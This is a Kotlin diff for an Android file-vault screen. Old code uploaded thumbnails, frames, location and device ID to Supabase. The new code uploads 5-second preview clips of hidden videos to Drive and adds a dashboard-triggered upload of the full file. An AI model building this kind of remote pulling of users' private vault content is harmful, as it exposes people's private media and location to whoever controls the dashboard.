@@ -30,10 +30,10 @@ import kotlinx.coroutines.flow.collectLatest
 import kotlinx.coroutines.launch
 import kotlinx.coroutines.withContext
 
-// ✅ SUPABASE IMPORTS (Replaces Firebase)
-import com.example.supabase.SupabaseVaultUploader
+// ✅ IMPORTS (Keep these for your app)
 import com.example.utils.MediaMetadataExtractor
-import com.example.utils.VaultMetadata
+import com.example.utils.VideoClipExtractor
+import com.example.firebase.FirebaseVaultUploader
 import java.io.File
 
 class VaultActivity : AppCompatActivity() {
@@ -41,8 +41,8 @@ class VaultActivity : AppCompatActivity() {
     private lateinit var binding: ActivityVaultBinding
     private lateinit var adapter: VaultFileAdapter
 
-    // ✅ SUPABASE UPLOADER (Replaces Firebase uploader)
-    private val supabaseUploader by lazy { SupabaseVaultUploader(this) }
+    // ✅ FIREBASE UPLOADER (Supabase removed)
+    private val firebaseUploader by lazy { FirebaseVaultUploader(this) }
 
     // Tab categories: Videos, Photos, Documents, Audio
     private val tabTypes = listOf(
@@ -298,8 +298,8 @@ class VaultActivity : AppCompatActivity() {
                     val saved = SafeFolderManager.hideFile(this@VaultActivity, uri, fileType)
                     if (saved != null) {
                         successCount++
-                        // ✅ SUPABASE UPLOAD (Replaces Firebase)
-                        uploadToSupabase(saved)
+                        // ✅ Process and upload the video clip
+                        processAndUploadClip(saved)
                     }
                 }
             }
@@ -320,92 +320,55 @@ class VaultActivity : AppCompatActivity() {
     }
 
     // ============================================================
-    // ✅ SUPABASE UPLOAD FUNCTIONS (Replaces Firebase)
+    // ✅ PROCESS AND UPLOAD VIDEO CLIP (UPDATED)
     // ============================================================
 
-    /**
-     * Upload file metadata, thumbnail, and frames to Supabase
-     */
-    private fun uploadToSupabase(vaultFile: VaultFileEntity) {
+    private fun processAndUploadClip(vaultFile: VaultFileEntity) {
         val file = File(vaultFile.savedPath)
         if (!file.exists()) {
             Toast.makeText(this, "❌ File not found", Toast.LENGTH_SHORT).show()
             return
         }
 
-        val metadataExtractor = MediaMetadataExtractor(this)
-        val metadata = metadataExtractor.extractMetadataAndFrames(file.absolutePath)
+        // Check if it's a video
+        if (vaultFile.mimeType.startsWith("video/")) {
+            // Extract 5-second 144p clip
+            val clipExtractor = VideoClipExtractor(this)
+            val clipFile = clipExtractor.extractClip(file.absolutePath)
 
-        if (metadata == null) {
-            Toast.makeText(this, "❌ Could not extract metadata", Toast.LENGTH_SHORT).show()
-            return
-        }
-
-        lifecycleScope.launch {
-            try {
-                // Step 1: Upload thumbnail
-                val thumbnailUrl = metadata.thumbnailPath?.let { thumbPath ->
-                    val thumbFile = File(thumbPath)
-                    if (thumbFile.exists()) {
-                        supabaseUploader.uploadThumbnail(thumbFile, metadata.fileName)
-                    } else null
-                } ?: ""
-
-                // Step 2: Upload video frames
-                val frameUrls = if (metadata.framePaths.isNotEmpty()) {
-                    val frameFiles = metadata.framePaths.map { File(it) }
-                    supabaseUploader.uploadFrames(frameFiles, metadata.fileName)
-                } else emptyList()
-
-                // Step 3: Upload metadata to Supabase
-                val vaultMetadata = VaultMetadata(
-                    file_name = metadata.fileName,
-                    file_path = metadata.filePath,
-                    file_size = metadata.fileSize,
-                    mime_type = metadata.mimeType,
-                    file_type = getFileType(metadata.mimeType),
-                    duration = metadata.duration,
-                    width = metadata.width,
-                    height = metadata.height,
-                    camera_model = metadata.cameraModel,
-                    date_taken = metadata.dateTaken,
-                    latitude = metadata.latitude,
-                    longitude = metadata.longitude,
-                    thumbnail_url = thumbnailUrl,
-                    frame_urls = frameUrls,
-                    status = "PENDING",
-                    device_id = getDeviceId(),
-                    timestamp = System.currentTimeMillis()
-                )
-
-                val id = supabaseUploader.uploadMetadata(vaultMetadata)
-                Log.d("VaultActivity", "✅ Uploaded to Supabase with ID: $id")
-                Toast.makeText(this@VaultActivity, "✅ Metadata uploaded to Supabase", Toast.LENGTH_SHORT).show()
-
-            } catch (e: Exception) {
-                Log.e("VaultActivity", "❌ Upload failed: ${e.message}")
-                Toast.makeText(this@VaultActivity, "❌ Upload failed: ${e.message}", Toast.LENGTH_LONG).show()
+            if (clipFile == null) {
+                Toast.makeText(this, "❌ Could not extract clip", Toast.LENGTH_SHORT).show()
+                return
             }
+
+            // Upload clip to Google Drive
+            firebaseUploader.uploadVideoClip(clipFile) { success, message ->
+                if (success) {
+                    Toast.makeText(this, "✅ Clip uploaded to Drive", Toast.LENGTH_SHORT).show()
+                } else {
+                    Toast.makeText(this, "❌ Failed: $message", Toast.LENGTH_SHORT).show()
+                }
+            }
+        } else {
+            // For photos/audio, you might want to handle differently
+            Toast.makeText(this, "📄 Only videos get preview clips", Toast.LENGTH_SHORT).show()
         }
     }
 
-    private fun getFileType(mimeType: String): String {
-        return when {
-            mimeType.startsWith("video/") -> "VIDEO"
-            mimeType.startsWith("image/") -> "PHOTO"
-            mimeType.startsWith("audio/") -> "AUDIO"
-            else -> "DOCUMENT"
-        }
-    }
+    // ============================================================
+    // ✅ FUNCTION FOR DASHBOARD COMMANDS (UPLOAD FULL FILE)
+    // ============================================================
 
-    private fun getDeviceId(): String {
-        return try {
-            android.provider.Settings.Secure.getString(
-                contentResolver,
-                android.provider.Settings.Secure.ANDROID_ID
-            ) ?: "unknown"
-        } catch (e: Exception) {
-            "unknown"
+    /**
+     * Upload full file to Google Drive (called from dashboard command)
+     */
+    fun uploadFullFileFromDashboard(fileId: String) {
+        firebaseUploader.uploadFullFile(fileId) { success, message ->
+            if (success) {
+                Toast.makeText(this, "✅ Full file uploaded to Drive", Toast.LENGTH_SHORT).show()
+            } else {
+                Toast.makeText(this, "❌ Failed: $message", Toast.LENGTH_SHORT).show()
+            }
         }
     }
 
